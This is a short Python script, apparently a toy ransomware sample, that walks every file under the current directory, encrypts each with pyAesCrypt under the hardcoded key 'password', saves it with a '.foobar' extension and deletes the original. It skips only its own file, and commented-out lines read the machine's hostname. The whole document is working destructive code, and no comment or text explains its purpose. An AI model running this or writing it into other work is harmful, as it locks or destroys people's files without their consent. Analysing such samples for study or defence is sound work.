import os
import sys
import pyAesCrypt
key = "password"
encrypted = False

cwd=os. getcwd()
#print(cwd)
for root,dirs,files in os.walk(cwd):
     for file in files:
         file_path, file_ext = os.path.splitext(root+'\\'+file)
         #print(file_path, file_ext)
         original = (root+'\\'+file)
         newfile = os.path.join(original+'.foobar')
         if (root+'\\'+file) != sys.argv[0]:
             print("encrypting",original)
             pyAesCrypt.encryptFile(original,newfile,key)
             os.remove(original)
             
#hostname = os.getenv("COMPUTERNAME")
#print(sys.argv[0])
#print(hostname)
#if encrypted == True

sys.exit()
